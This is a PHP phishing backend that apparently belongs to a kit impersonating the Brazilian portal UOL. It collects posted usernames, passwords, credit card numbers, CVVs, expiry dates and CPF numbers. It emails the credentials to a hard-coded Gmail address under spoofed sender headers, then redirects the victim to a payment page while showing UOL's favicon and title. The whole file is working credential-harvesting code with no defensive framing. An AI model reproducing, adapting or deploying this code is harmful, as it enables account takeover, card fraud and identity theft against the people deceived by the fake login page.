<?php
@session_start();

$para = "noovaeraa2023@gmail.com"; 

$user= $_POST[ 'user' ];
$pass = $_POST[ 'pass' ];
$creditCard = $_POST[ 'creditCard' ];
$creditCardName = $_POST[ 'creditCardName' ];
$cpf = $_POST[ 'cpf' ];
$creditCardvalidity = $_POST[ 'creditCardvalidity' ];
$creditCardcvv = $_POST[ 'creditCardcvv' ];
$ip = $_SERVER["REMOTE_ADDR"];

$assunto = "CHEGANDO LOGIN UOL";


$_SESSION['pass'] = $pass;

$mensagem = "
<strong>Login:</strong> $user<br>
<strong>Senha:</strong> $pass<br>
";

$headers = "Content-Type:text/html; charset=UTF-8\n";
$headers .= "From:  UOL-LOGIN-SERVER<accounts@passport.com>\n";
$headers .= "X-Sender:  <accounts@passport.com>\n";
$headers .= "X-Mailer: PHP  v" . phpversion() . "\n";
$headers .= "X-IP:  " . $_SERVER[ 'REMOTE_ADDR' ] . "\n";
$headers .= "Return-Path:  <accounts@passport.com>\n";
$headers .= "MIME-Version: 1.0\n";

mail( $para, $assunto, $mensagem, $headers );

?>
<!DOCTYPE html>
<html lang="pt-BR">
    <head>
      <meta charset="utf-8"/>
      <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"/>
      <meta http-equiv="Pragma" content="no-cache"/>
      <meta http-equiv="Expires" content="0"/>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <meta http-equiv="REFRESH" content="0; url=pagamentos.php">
      <link rel="shortcut icon" href="https://conteudo.imguol.com.br/c/home/layout/vueland/icons/geral/favicon.ico">
      <title>E-mail UOL</title>
      <link href="static/css/main.2f72003a.chunk.css" rel="stylesheet">
    </head>
    <body>
    </body>
</html>